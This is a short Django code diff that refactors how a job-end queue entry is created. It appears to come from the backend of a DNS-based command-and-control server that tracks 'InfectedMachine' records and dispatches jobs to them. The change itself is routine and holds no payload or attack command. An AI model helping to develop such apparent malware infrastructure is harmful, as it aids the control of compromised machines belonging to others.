@@ -6,7 +6,7 @@ from decouple import config
 from django.utils import timezone
 
 from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
-from djangoproject.models import InfectedMachine, JobEndQueue
+from djangoproject.models import InfectedMachine
 from djangoproject.services.DnsService import DnsService
 
 
@@ -62,7 +62,7 @@ class ExecService:
         if job is None:
             return
 
-        JobEndQueue.objects.create(job_id=job.id, processable_at=timezone.now() + timedelta(minutes=1))
+        job.jobendqueue_set.create(processable_at=timezone.now() + timedelta(minutes=1))
 
     def create_machine(self, machine_id: str) -> InfectedMachine:
         machine = InfectedMachine(dns_identifier=machine_id)
